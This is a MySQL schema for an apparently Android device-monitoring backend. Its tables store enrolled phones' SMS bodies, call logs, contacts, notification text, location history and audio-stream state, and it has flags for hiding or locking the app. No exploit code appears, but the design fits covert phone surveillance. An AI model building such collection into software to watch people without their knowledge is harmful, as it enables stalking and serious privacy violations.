-- MySQL schema mirror for phpMyAdmin (optional admin DB).
-- Runtime app uses SQLite at backend/data/device_safety.db unless DEVICE_SAFETY_USE_MYSQL=1.

CREATE TABLE IF NOT EXISTS devices (
    device_id VARCHAR(64) PRIMARY KEY,
    manufacturer VARCHAR(128) NOT NULL DEFAULT '',
    model VARCHAR(128) NOT NULL DEFAULT '',
    android_version VARCHAR(32) NOT NULL DEFAULT '',
    api_level VARCHAR(16) NOT NULL DEFAULT '',
    device_token_hash VARCHAR(255) DEFAULT NULL,
    pending_device_token VARCHAR(255) DEFAULT NULL,
    device_token_sealed TEXT,
    device_admin_active TINYINT(1) NOT NULL DEFAULT 0,
    last_wifi_ssid VARCHAR(255) DEFAULT NULL,
    geofence_ok TINYINT(1) DEFAULT NULL,
    usage_summary_json LONGTEXT,
    battery_summary_json LONGTEXT,
    usage_summary_at BIGINT DEFAULT NULL,
    battery_summary_at BIGINT DEFAULT NULL,
    last_latitude DOUBLE DEFAULT NULL,
    last_longitude DOUBLE DEFAULT NULL,
    last_location_accuracy DOUBLE DEFAULT NULL,
    last_location_at BIGINT DEFAULT NULL,
    location_permission_granted TINYINT(1) DEFAULT NULL,
    last_location_provider VARCHAR(64) DEFAULT NULL,
    last_location_altitude DOUBLE DEFAULT NULL,
    last_location_speed DOUBLE DEFAULT NULL,
    usage_access_granted TINYINT(1) DEFAULT NULL,
    call_log_permission_granted TINYINT(1) DEFAULT NULL,
    sms_permission_granted TINYINT(1) DEFAULT NULL,
    contacts_permission_granted TINYINT(1) DEFAULT NULL,
    audio_permission_granted TINYINT(1) DEFAULT NULL,
    audio_stream_active TINYINT(1) DEFAULT NULL,
    storage_permission_granted TINYINT(1) DEFAULT NULL,
    notification_access_granted TINYINT(1) DEFAULT NULL,
    app_locked TINYINT(1) NOT NULL DEFAULT 0,
    app_hidden TINYINT(1) NOT NULL DEFAULT 0,
    registered TINYINT(1) NOT NULL DEFAULT 1,
    device_group VARCHAR(128) NOT NULL DEFAULT '',
    created_at BIGINT NOT NULL,
    last_seen_at BIGINT NOT NULL,
    deregistered_at BIGINT DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS admins (
    username VARCHAR(128) PRIMARY KEY,
    password_hash VARCHAR(255) NOT NULL,
    created_at BIGINT NOT NULL,
    updated_at BIGINT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS heartbeats (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    event VARCHAR(128) NOT NULL,
    details TEXT NOT NULL,
    timestamp BIGINT NOT NULL,
    INDEX idx_heartbeats_device_time (device_id, timestamp),
    CONSTRAINT fk_heartbeats_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS enrollment_tokens (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    token_hash VARCHAR(255) NOT NULL UNIQUE,
    label VARCHAR(255) NOT NULL DEFAULT '',
    created_at BIGINT NOT NULL,
    expires_at BIGINT NOT NULL,
    used_at BIGINT DEFAULT NULL,
    used_by_device_id VARCHAR(64) DEFAULT NULL,
    active TINYINT(1) NOT NULL DEFAULT 1,
    INDEX idx_enrollment_tokens_hash (token_hash)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS policy_settings (
    `key` VARCHAR(191) PRIMARY KEY,
    value TEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS server_config (
    `key` VARCHAR(191) PRIMARY KEY,
    value TEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS smtp_config (
    `key` VARCHAR(191) PRIMARY KEY,
    value TEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS geofence_settings (
    `key` VARCHAR(191) PRIMARY KEY,
    value TEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS ota_settings (
    `key` VARCHAR(191) PRIMARY KEY,
    value TEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS wifi_profile_settings (
    `key` VARCHAR(191) PRIMARY KEY,
    value TEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS device_settings (
    device_id VARCHAR(64) NOT NULL,
    `key` VARCHAR(191) NOT NULL,
    value TEXT NOT NULL,
    PRIMARY KEY (device_id, `key`),
    CONSTRAINT fk_device_settings_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS password_resets (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(128) NOT NULL,
    token_hash VARCHAR(255) NOT NULL,
    expires_at BIGINT NOT NULL,
    used TINYINT(1) NOT NULL DEFAULT 0,
    created_at BIGINT NOT NULL,
    INDEX idx_password_resets_token (token_hash)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS device_commands (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    command_type VARCHAR(128) NOT NULL,
    payload LONGTEXT NOT NULL,
    status VARCHAR(32) NOT NULL DEFAULT 'pending',
    created_at BIGINT NOT NULL,
    delivered_at BIGINT DEFAULT NULL,
    completed_at BIGINT DEFAULT NULL,
    result LONGTEXT NOT NULL,
    INDEX idx_device_commands_device_status (device_id, status),
    CONSTRAINT fk_device_commands_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS device_location_history (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    latitude DOUBLE NOT NULL,
    longitude DOUBLE NOT NULL,
    accuracy DOUBLE DEFAULT NULL,
    timestamp BIGINT NOT NULL,
    INDEX idx_device_location_history_device_time (device_id, timestamp),
    CONSTRAINT fk_device_location_history_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS device_call_history (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    source_id VARCHAR(191) NOT NULL DEFAULT '',
    phone_number VARCHAR(64) NOT NULL DEFAULT '',
    contact_name VARCHAR(255) NOT NULL DEFAULT '',
    call_type VARCHAR(64) NOT NULL DEFAULT '',
    country_iso VARCHAR(32) NOT NULL DEFAULT '',
    location_label VARCHAR(255) NOT NULL DEFAULT '',
    duration_seconds BIGINT NOT NULL DEFAULT 0,
    timestamp BIGINT NOT NULL,
    INDEX idx_device_call_history_device_time (device_id, timestamp),
    UNIQUE KEY idx_device_call_history_unique (device_id, source_id),
    INDEX idx_device_call_history_fallback (device_id, timestamp, phone_number, call_type, duration_seconds),
    CONSTRAINT fk_device_call_history_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS device_sms_history (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    source_id VARCHAR(191) NOT NULL DEFAULT '',
    address VARCHAR(255) NOT NULL DEFAULT '',
    body MEDIUMTEXT NOT NULL,
    sms_type VARCHAR(64) NOT NULL DEFAULT '',
    read_state VARCHAR(32) NOT NULL DEFAULT '',
    thread_id VARCHAR(64) NOT NULL DEFAULT '',
    subject VARCHAR(255) NOT NULL DEFAULT '',
    timestamp BIGINT NOT NULL,
    INDEX idx_device_sms_history_device_time (device_id, timestamp),
    UNIQUE KEY idx_device_sms_history_unique (device_id, source_id),
    INDEX idx_device_sms_history_fallback (device_id, timestamp, address, sms_type(32), body(255)),
    CONSTRAINT fk_device_sms_history_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS device_contacts (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    source_id VARCHAR(191) NOT NULL DEFAULT '',
    contact_id VARCHAR(191) NOT NULL DEFAULT '',
    display_name VARCHAR(255) NOT NULL DEFAULT '',
    phone_number VARCHAR(64) NOT NULL DEFAULT '',
    phone_type VARCHAR(64) NOT NULL DEFAULT '',
    phone_label VARCHAR(128) NOT NULL DEFAULT '',
    email VARCHAR(255) NOT NULL DEFAULT '',
    organization VARCHAR(255) NOT NULL DEFAULT '',
    starred TINYINT(1) NOT NULL DEFAULT 0,
    updated_at BIGINT NOT NULL DEFAULT 0,
    INDEX idx_device_contacts_device_name (device_id, display_name),
    UNIQUE KEY idx_device_contacts_unique (device_id, source_id),
    CONSTRAINT fk_device_contacts_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS security_otp_requests (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    action_type VARCHAR(64) NOT NULL,
    status VARCHAR(32) NOT NULL DEFAULT 'pending',
    otp_hash VARCHAR(255) DEFAULT NULL,
    device_otp_code VARCHAR(32) DEFAULT NULL,
    created_at BIGINT NOT NULL,
    approved_at BIGINT DEFAULT NULL,
    expires_at BIGINT DEFAULT NULL,
    used_at BIGINT DEFAULT NULL,
    INDEX idx_security_otp_requests_device_status (device_id, status),
    CONSTRAINT fk_security_otp_requests_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS device_notifications (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    source_id VARCHAR(191) NOT NULL DEFAULT '',
    package_name VARCHAR(255) NOT NULL DEFAULT '',
    app_name VARCHAR(255) NOT NULL DEFAULT '',
    title VARCHAR(512) NOT NULL DEFAULT '',
    body MEDIUMTEXT NOT NULL,
    category VARCHAR(64) NOT NULL DEFAULT 'general',
    timestamp BIGINT NOT NULL,
    INDEX idx_device_notifications_device_time (device_id, timestamp),
    UNIQUE KEY idx_device_notifications_unique (device_id, source_id),
    CONSTRAINT fk_device_notifications_device FOREIGN KEY (device_id) REFERENCES devices(device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS app_releases (
    id INT AUTO_INCREMENT PRIMARY KEY,
    package_name VARCHAR(255) NOT NULL,
    app_label VARCHAR(255) NOT NULL DEFAULT '',
    version_name VARCHAR(64) NOT NULL,
    version_code INT NOT NULL,
    apk_filename VARCHAR(255) NOT NULL,
    release_notes TEXT,
    created_at BIGINT NOT NULL,
    active TINYINT(1) NOT NULL DEFAULT 1,
    INDEX idx_app_releases_pkg (package_name, version_code)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS update_manager_targets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    package_name VARCHAR(255) NOT NULL UNIQUE,
    app_label VARCHAR(255) NOT NULL DEFAULT '',
    enabled TINYINT(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
